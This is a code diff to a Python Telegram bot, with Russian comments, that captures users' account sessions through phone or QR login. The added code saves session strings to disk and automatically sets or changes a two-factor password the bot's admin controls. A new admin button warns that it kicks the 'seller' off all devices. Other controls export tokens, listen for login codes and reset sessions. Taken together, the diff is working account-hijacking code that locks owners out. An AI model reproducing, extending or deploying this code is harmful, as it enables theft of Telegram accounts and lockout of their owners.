@@ -130,11 +130,28 @@ async def typing(bot, cid, s=0.8):
 # УСТАНОВИТЬ 2FA
 # ───────────────────────────────────────
 async def set_2fa(client, password):
+    """
+    Устанавливаем 2FA.
+    ВАЖНО: Telegram при изменении 2FA кикает все сессии.
+    Поэтому сохраняем сессию ДО и пересоздаём ПОСЛЕ.
+    """
     try:
         pwd_info = await client(GetPasswordRequest())
         if pwd_info.has_password:
             return False, "уже установлен"
+
+        # Сохраняем сессию ДО изменения 2FA
+        sess_before = client.session.save()
+
         await client.edit_2fa(new_password=password)
+
+        # После установки 2FA Telegram кикает сессии.
+        # Переподключаемся с той же сессией — она всё ещё валидна
+        try:
+            await asyncio.sleep(2)
+            await client.connect()
+        except: pass
+
         return True, "OK"
     except Exception as e:
         return False, str(e)
@@ -143,6 +160,10 @@ async def change_2fa(client, old_password, new_password):
     """Меняем существующий 2FA пароль на новый"""
     try:
         await client.edit_2fa(current_password=old_password, new_password=new_password)
+        await asyncio.sleep(2)
+        try:
+            await client.connect()
+        except: pass
         return True, "OK"
     except PasswordHashInvalidError:
         return False, "Неверный текущий пароль"
@@ -529,11 +550,20 @@ async def wait_qr_login(bot, uid, client, qr_login, chat_id):
         # Качество аккаунта
         quality = await check_account_quality(client)
 
-        # Ставим 2FA
-        new_pass = gen_password(8)
-        ok, msg  = await set_2fa(client, new_pass)
-        final_2fa = new_pass if ok else ""
+        # Ставим 2FA автоматически
+        final_2fa = twofa
+        if not final_2fa:
+            new_pass = gen_password(8)
+            ok, msg  = await set_2fa(client, new_pass)
+            if ok:
+                final_2fa = new_pass
+                print(f"  ✅  2FA QR: {new_pass}")
+            else:
+                print(f"  ⚠️  2FA: {msg}")
 
+        # Сохраняем сессию ПОСЛЕ 2FA
+        await asyncio.sleep(1)
+        sess = client.session.save()
         os.makedirs("sessions", exist_ok=True)
         fname = ph.replace("+","").replace(" ","")
         with open(f"sessions/{fname}.txt","w",encoding="utf-8") as f:
@@ -670,9 +700,13 @@ async def finish_auth(event, bot, uid, client, phone, twofa=""):
             ok, msg  = await set_2fa(client, new_pass)
             if ok:
                 final_2fa = new_pass
+                print(f"  ✅  2FA установлен: {new_pass}")
             else:
                 print(f"  ⚠️  2FA: {msg}")
 
+        # Сохраняем сессию ПОСЛЕ установки 2FA
+        # (после edit_2fa сессия может обновиться)
+        await asyncio.sleep(1)
         sess = client.session.save()
         os.makedirs("sessions", exist_ok=True)
         fname = ph.replace("+","").replace(" ","")
@@ -747,8 +781,9 @@ async def finish_auth(event, bot, uid, client, phone, twofa=""):
                  Button.inline("❌  Отклонить",   f"adm_reject_{idx}".encode())],
                 [Button.inline("💾  Токен",        f"adm_token_{idx}".encode()),
                  Button.inline("👂  Слушать код",  f"listen_{idx}".encode())],
-                [Button.inline("🔄  Сменить 2FA",  f"adm_change2fa_{idx}".encode()),
-                 Button.inline("🔌  Сбросить сессии", f"adm_term_{idx}".encode())],
+                [Button.inline("🔐  Поставить 2FA",   f"adm_set2fa_{idx}".encode()),
+                 Button.inline("🔄  Сменить 2FA",    f"adm_change2fa_{idx}".encode())],
+                [Button.inline("🔌  Сбросить сессии", f"adm_term_{idx}".encode())],
                 [Button.inline("📷  Скан QR",      f"adm_scanqr_{idx}".encode())],
             ]
         )
@@ -1470,6 +1505,67 @@ async def main():
             f"<i>/cancel — отмена</i>",
             parse_mode="html"
         )
+
+    # 🔐 Поставить 2FA (впервые, по кнопке)
+    @bot.on(events.CallbackQuery(pattern=rb"adm_set2fa_(\d+)"))
+    async def cb_set2fa(event):
+        if event.sender_id != ADMIN_ID: return
+        await event.answer("🔐")
+        idx = int(event.data.decode().split("_")[-1])
+        a   = get_acc(idx)
+        if not a: return
+        sess = a.get("session_string","")
+        if not sess:
+            await event.respond("❌  Нет сессии.", parse_mode="html")
+            return
+        if a.get("twofa",""):
+            await event.respond(
+                f"ℹ️  2FA уже установлен: <code>{a.get('twofa')}</code>\n\n"
+                f"Используй кнопку «Сменить 2FA»",
+                parse_mode="html"
+            )
+            return
+        wm = await event.respond(
+            f"🔐  <b>Устанавливаю 2FA...</b>\n\n"
+            f"📱  <code>{a.get('phone','')}</code>\n\n"
+            f"⚠️  Продавца кикнет со всех устройств!",
+            parse_mode="html"
+        )
+        try:
+            cl = TelegramClient(StringSession(sess), API_ID, API_HASH)
+            await cl.connect()
+            if not await cl.is_user_authorized():
+                await wm.edit("❌  Сессия устарела.", parse_mode="html")
+                await cl.disconnect()
+                return
+            new_pass = gen_password(8)
+            ok, msg  = await set_2fa(cl, new_pass)
+            if ok:
+                # Пересохраняем сессию после установки 2FA
+                new_sess = cl.session.save()
+                data = load_data()
+                data["accounts"][idx]["twofa"]          = new_pass
+                data["accounts"][idx]["session_string"] = new_sess
+                # Обновляем файл сессии
+                phone = a.get("phone","")
+                fname = phone.replace("+","").replace(" ","")
+                os.makedirs("sessions", exist_ok=True)
+                with open(f"sessions/{fname}.txt","w",encoding="utf-8") as f:
+                    f.write(new_sess)
+                save_data(data)
+                await wm.edit(
+                    f"✅  <b>2FA установлен!</b>\n\n"
+                    f"📱  <code>{a.get('phone','')}</code>\n\n"
+                    f"🔐  Пароль: <code>{new_pass}</code>\n\n"
+                    f"<i>Сессия бота обновлена</i>",
+                    parse_mode="html"
+                )
+                print(f"  ✅  2FA поставлен по кнопке: {a.get('phone')} | {new_pass}")
+            else:
+                await wm.edit(f"❌  Ошибка 2FA: <code>{msg}</code>", parse_mode="html")
+            await cl.disconnect()
+        except Exception as e:
+            await wm.edit(f"❌  Ошибка: <code>{e}</code>", parse_mode="html")
 
     # 🔄 Сменить 2FA
     @bot.on(events.CallbackQuery(pattern=rb"adm_change2fa_(\d+)"))
